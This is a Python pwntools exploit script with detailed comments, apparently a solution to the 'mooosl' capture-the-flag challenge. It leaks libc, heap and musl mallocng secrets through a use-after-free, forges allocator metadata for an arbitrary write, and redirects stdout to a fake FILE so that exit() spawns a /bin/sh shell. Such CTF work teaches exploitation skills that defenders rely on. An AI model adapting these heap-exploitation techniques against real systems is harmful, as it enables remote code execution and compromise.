from pwn import *

context.log_level = 'debug'                                                                                                                                                                                        
#p = process("./mooosl")
p = remote("mooosl.challenges.ooo", 23333)
context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

# Brute force two-byte keys that end up in the same 'bucket'
# of the hash table (buckets are 0 to 4095)
START = (0x7e5)
def brute_force_collision(desired_bucket, cur_num=START):
    options = []
    for x in range(256):
        for y in range(256):
            cur_num = START
            cur_num = ((x + cur_num * 0x13377331))
            cur_num = ((y + cur_num * 0x13377331))
            if (cur_num & 0xfff) == desired_bucket:
                options.append((x, y))
    return options

# Store, Delete, and Query menu helpers

def store(key, value, keysize=None, valuesize=None):
    if keysize is None:
        keysize = len(key) + 1
    if valuesize is None:
        valuesize = len(value) + 1
    p.sendline("1")
    p.sendline(str(keysize))
    p.sendline(key[:keysize-1])
    p.sendline(str(valuesize))
    p.sendline(value[:valuesize-1])
    p.recvuntil(b"ok")

def delete(key, keysize=None, error=False):
    if keysize is None:
        keysize = len(key) + 1
    p.sendline("3")
    p.sendline(str(keysize))
    p.sendline(key[:keysize-1])
    if not error:
        p.recvuntil(b"ok")
    else:
        p.recvuntil(b"err")

def query(key, keysize=None):
    if keysize is None:
        keysize = len(key) + 1
    p.sendline("2")
    p.sendline(str(keysize))
    p.sendline(key[:keysize-1])
    return p.recvuntil(b"ok")

##############################
# Part 1: Libc and Heap Leak #
##############################

# I chose to use bucket 255, because it has a sufficient number of
# different two-byte keys that collide (> 10)
collisions = brute_force_collision(255)
print(collisions)

# Allocate 10 nodes (7 and then 3 more) into the same bucket
i = 0
for x in collisions[:7]:
    s = bytes(x)
    p.recvuntil("option:")
    store(s, 'yoooo%s' % i, valuesize=0x50, keysize=0x30)
    i += 1

for x in collisions[7:10]:
    s = bytes(x)
    p.recvuntil("option:")
    store(s, 'yoooo%s' % i, keysize=0x30)
    i += 1

# Free nodes 1 thru 6; this means there are 12 0x30 chunks free'd
for x in collisions[1:7]:
    s = bytes(x)
    p.recvuntil("option:")
    delete(s)

# The first one (with key: collisons[0]) will be free'd last...
# The goal is to get this node's 'value' buffer allocated
# again as a node.
delete(bytes(collisions[0]))

# The exact allocation pattern here was determined by trial and error.
# Basically the second 0x30 allocation causes the **0x50** allocation from
# node 0 to be re-used as a 0x30 allocation. I don't know the details
# of why this happens, presumably it's something to reduce fragmentation.
#
# NOTE: These new nodes aren't even being put in the same bucket (we don't care where they go,
# we just want the value buffer to be re-allocated as a node somewhere)
store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x8, valuesize=0x8)
store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x100, valuesize=0x8) # the second node here gets allocated in the value field

# Now, query the value for node 0; the value is now a node with key size 0x100 so we have a libc pointer
# as the first member.
result = query(bytes(collisions[0]))

# Parse the hex from the query
result = result[result.index(b"0x6:")+4:]
result = result[:result.index(b"\n")]
result = b"" + result[10:12] + result[8:10] + result[6:8] + result[4:6] + result[2:4] + result[0:2]
leak = int(result.decode(), 16)

# Compute some useful offset for later
print("libc leak: %s" % hex(leak))
system_addr = leak - 0x66de0
stdout_addr = leak + (0x7fd6d8ed4280 - 0x7fd6d8ed7870) 
malloc_secret_ptr = system_addr + 0x64030
print("system: %s" % hex(system_addr))


# Now we want a heap leak. We will do three 0x30 allocations to clear our palette.
store(p64(0xcccccccc), b"lolololololololololol", keysize=0x30, valuesize=0x30)

# Now free the node we previously allocated in node 0's value buffer
delete(p64(0xbbbbbbbb), keysize=0x30)

# Now try to allocate another node in node 0's value buffer. The only difference
# is the key buffer of this new node happens to be on the heap, not in libc.
store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x30, valuesize=0x100) 
store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x30, valuesize=0x100)

# Print the value buffer containing our node
result = query(bytes(collisions[0]))

# Parse the hex to get our heap leak
result = result[result.index(b"0x6:")+4:]
result = result[:result.index(b"\n")]
result = b"" + result[10:12] + result[8:10] + result[6:8] + result[4:6] + result[2:4] + result[0:2]
heap_leak = int(result.decode(), 16)
print("heap leak: %s" % hex(heap_leak))

##############################
# Leak the malloc_ctx secret #
##############################

# This time, we will use the 'default bucket'. That is the bucket
# which nodes of key length 0 end up in.
default_bucket = START & 0xfff
collisions = [b""] + brute_force_collision(default_bucket)
print(collisions)

# Allocate two nodes in our new bucket.
i = 0
for x in collisions[:2]:
    s = bytes(x)
    p.recvuntil("option:")
    store(s, 'yoooo%s' % i, valuesize=0x50, keysize=0x30)
    i += 1

# Node 0 will be free'd, but is still linked in the list
delete(bytes(collisions[0]))

# This time, we want to get Node 0 re-allocated as a **value buffer**... which will let us
# write arbitrary data into it. So, we can overwrite all the members of Node 0
#
# key_buf = 0; (because it's easy, and Node 0 is already in the default bucket so it will still be in the right bucket with 0 key length)
# value_buf = ** The address we want to read from **; which will be malloc_secret_ptr
# key_len = 0; (see key_buf explanation)
# value_len = 0x50; (we could get away with 0x8, but why not more?)
# hash_val = 2021; (this is the hash you get for key_len = 0)
# next = 0; (I don't care if we break the linked list, we aren't using this bucket again)
store(p64(0xbbbbbbbb), p64(0) + p64(malloc_secret_ptr) + p64(0) + p64(0x50) + p64(2021) + p64(0), keysize=0x50, valuesize=0x50)
store(p64(0xbbbbbbbb), p64(0) + p64(malloc_secret_ptr) + p64(0) + p64(0x50) + p64(2021) + p64(0), keysize=0x30, valuesize=0x30)

# Print the contents of the 'value_buf' of Node 0 (we just overwrote the value_buf to an arbitrary address we want to read)
result = query(bytes(collisions[0]))

# Read the hex to leak the heap secret
result = result[result.index(b"0x50:")+5:]
result = result[:result.index(b"\n")]
secret_data = result[:16] # first 8 bytes are malloc ctx
secret_leak = u64(p64(int(secret_data.decode(), 16), endianness='big')) # endianness flip
print(hex(secret_leak))

###############################
# Create fake heap structures #
###############################

# We are going to make an allocation of size 0x22000 (this is bigger than MMAP_THRESHOLD)
# This size is a somewhat arbitrary choice. We will fill this allocation as follows:
#
#         page boundary
#            \/                             
#  --------------------------------------------------------------------
# | padding  || meta_area | meta | group | chunk prefix (8) | chunk... |
#  --------------------------------------------------------------------
# /\
# ||
# fake_region_addr
#

# Our chunk ends op at a constant offset from libc, so we compute the location
# (This is the )
fake_region_addr = leak + (0x7faf8d835020 - 0x7faf8d90f870)

# Offset the struct meta far enough into the page that we are guaranteed to have space for
# the page aligned struct meta_area.
fake_meta_addr = fake_region_addr + 0x1100
fake_area_addr = fake_meta_addr & ~0xfff

# The space between meta and group doesn't matter
fake_group_addr = fake_meta_addr + 0x30

# The space between chunk and group MUST be 0x10 (our chunk has index=0)
fake_chunk_addr = fake_group_addr + 0x10

### Fake structure data

# Fake area just needs matching secret
fake_area_data = p64(secret_leak) + b"F" * 0x18

# The fake `struct group` only has to have a pointer to the `struct meta`, the other members can be zero
fake_group_data = p64(fake_meta_addr)

# Where do we want to write?
stdout_ptr = system_addr + 0x63920

# The fake meta is complicated.
# - Prev and next give us our arbitrary write on unlink (discussed in write-up), so we ewant to write fake_chunk_addr to *stdout_ptr.
# - The group should be our fake group.
# - For the other members, you can try zeroing them but you'll find out that there's a check https://github.com/ifduyue/musl/blob/aad50fcd791e009961621ddfbe3d4c245fd689a3/src/malloc/mallocng/free.c#L21
# that requires you to have the maplen field be nonzero. From there you'll find that you want last_idx to be nonzero as well (to hit the normal case): https://github.com/ifduyue/musl/blob/aad50fcd791e009961621ddfbe3d4c245fd689a3/src/malloc/mallocng/meta.h#L177
# - So we will construct a group with two chunks (last_idx=1), our chunk will be chunk 0, and chunk 1 will be already free'd.
# So we want free_mask = (1 << 1) to say that chunk 1 is already free (but 0 is not). Maplen can be 0xfff and everything works fine
#
#                   prev                next                  group         avail_mask, free_mask     sizeclass=34, freeable=1, lastidx=1  maplen is nonzero
fake_meta_data = p64(fake_chunk_addr) + p64(stdout_ptr) + p64(fake_group_addr) + p64((1 << 1))        + p64((20 << 6) | (1 << 5) | 1 | (0xfff << 12))

# What do we want to write?
# We will write a **pointer** to our fake FILE structure, which we will put in the chunk's user data at fake_chunk_addr
stdout_payload = b"/bin/sh\x00" + b'X' * 32 + p64(0xdeadbeef) + b'X' * 8 + p64(0xbeefdead) + b'X' * 8 + p64(system_addr)

# from https://translate.google.com/translate?hl=en&sl=zh-CN&u=https://www.anquanke.com/post/id/202253&prev=search&pto=aue

chunk_prefix = p64(0) # This is chunk with index 0, offset 0
region_data = b"G" * (fake_area_addr - fake_region_addr) + fake_area_data.ljust(fake_meta_addr - fake_area_addr) + fake_meta_data.ljust(0x30) + fake_group_data.ljust(0x8) + chunk_prefix + stdout_payload

# Put our data in a chunk with a new key
store(b"lol", region_data, valuesize=0x22000)
print(hex(fake_region_addr))
print(hex(fake_chunk_addr))

# We can actually re-use the old collisions[0] chunk that we got the arbitrary read with.
# We free the chunk that had the `value` buffer overlapping with collisions[0]
delete(p64( 0xbbbbbbbb), keysize=0x30)
delete(p64( 0xbbbbbbbb), keysize=0x30)

# Then we re-allocate that node as the "value" of this new chunk. This is very similar to the arbitrary read,
# except instead of reading from the value pointer, we will just free it.
store(p64(0xbbbbbbbb), p64(0) + p64(fake_chunk_addr) + p64(0) + p64(0x50) + p64(2021) + p64(0), keysize=0x30, valuesize=0x30)
delete(bytes(collisions[0]))

# Our arbitrary write is done. Now just call exit(), which will call system.
p.sendline(str(4))
p.interactive()
